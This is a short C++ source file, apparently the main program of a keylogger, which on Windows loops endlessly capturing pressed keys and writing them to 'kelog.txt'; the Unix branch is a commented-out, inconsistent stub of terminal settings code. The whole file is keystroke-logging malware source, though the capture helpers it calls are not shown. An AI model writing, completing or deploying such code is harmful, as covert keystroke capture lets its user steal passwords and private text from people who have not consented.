#include <iostream>
#include "keylog.h"

using namespace std;

int main() {
    #if defined(__WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
    cout << "Windows\r\n";
    while (1) {
        writeToFile("kelog.txt", getAscii(getPressedKeyboardState()));
    }
    #elif __unix__
    /*struct termios old, new;
    tcgetattr( fileno( stdin ), &oldSettings );
    newSettings = oldSettings;
    newSettings.c_lflag &= (~ICANON & ~ECHO);
    tcsetattr( fileno( stdin ), TCSANOW, &newSettings );*/
    cout << "UNIX\n";
    #endif
}